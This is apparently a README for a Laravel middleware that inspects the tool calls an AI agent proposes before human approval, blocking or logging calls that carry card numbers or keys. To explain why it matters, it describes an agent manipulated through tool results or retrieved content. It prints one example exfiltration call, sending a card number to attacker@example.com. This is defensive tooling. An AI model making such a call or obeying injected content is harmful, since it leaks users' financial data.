## Introduction

`ToolApprovalGuard` is a Laravel AI SDK agent middleware that inspects the tool calls an agent proposes while pausing for human approval, before those calls are ever surfaced for review.

It can block, log, or fully delegate handling to a custom callback.

> [!Important]
> This middleware is part of the [Intercept middleware collection](https://github.com/promptphp/intercept). It inspects the tool calls the model proposed. It cannot inspect the tool results, retrieved documents, or conversation history that may have influenced them.

## Why this matters

Intercept sees the prompt on its way to the provider. It does not see what a tool returns, what a retrieval step pulled in, or what the model then decided to do with it.

When an agent is manipulated by content Intercept never saw, the damage shows up as a tool call:

```text
send_email(to: "attacker@example.com", body: "card 4111111111111111")
```

`ToolApprovalGuard` inspects those proposed calls. It is the first point downstream of that blind spot where the middleware pipeline can act.

By default it is the **card number** that flags this call, not the address. A mail tool is expected to carry an email address, so the defaults cover only values that are essentially never a legitimate argument: card numbers, API keys and bearer tokens. Contact data and locators can be added, but the destination itself is better controlled with `allowed_tools` / `denied_tools` and domain allowlisting inside the tool.

## Quick start

### Installation

```sh
composer require promptphp/intercept-tool-approval-guard
```

You may publish the config or not, the middleware works out of the box.

```sh
php artisan vendor:publish --tag=intercept-config
```

### Usage

Return the `ToolApprovalGuard` middleware on an agent's middleware method.

> [!Important]
> To add middleware to an agent, implement the `HasMiddleware` interface and define a middleware method that returns an array of middleware classes.

```php
use Laravel\Ai\Contracts\HasMiddleware;
use PromptPHP\Intercept\ToolApprovalGuard\ToolApprovalGuard;

class SupportAgent implements Agent, HasMiddleware
{
    public function middleware(): array
    {
        return [
            new ToolApprovalGuard,
        ];
    }
}
```

The middleware only acts when a run pauses for approval. Agents without approval-gated tools are unaffected.

### Restricting which tools may be proposed

```php
new ToolApprovalGuard(
    deniedTools: ['delete_record'],
)
```

```php
new ToolApprovalGuard(
    allowedTools: ['search_docs', 'read_ticket'],
)
```

An empty `allowedTools` permits every tool. A non-empty list permits only those named.

### Observing before enforcing

```php
new ToolApprovalGuard(
    action: 'log',
)
```

> For the complete guide, see the [full documentation](#documentation) below.

## Documentation

Full documentation can be found at [https://intercept.promptphp.com/](https://intercept.promptphp.com/) or the [docs](docs/) directory on GitHub.

## Contributing

Thank you for considering contributing to Intercept by PromptPHP. The contribution guide can be found in
[CONTRIBUTING.md](CONTRIBUTING.md).

## Code of Conduct

We follow the Laravel [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct). We expect you to abide by these guidelines as well.

## Security Vulnerabilities

If you discover a security vulnerability within Intercept by PromptPHP, please email Victor Ukam at [victorjohnukam@gmail.com](victorjohnukam@gmail.com). All security vulnerabilities will be addressed promptly.

## License

Intercept by PromptPHP is open-sourced software licensed under the [MIT license](LICENSE).

## Support

This library is created by [Victor Ukam](https://victorukam.com) with contributions from the [Open Source Community](https://github.com/promptphp/Intercept/graphs/contributors). If you've found this package useful, please consider [sponsoring this project](https://github.com/sponsors/veeqtoh). It will go a long way to help with maintenance.
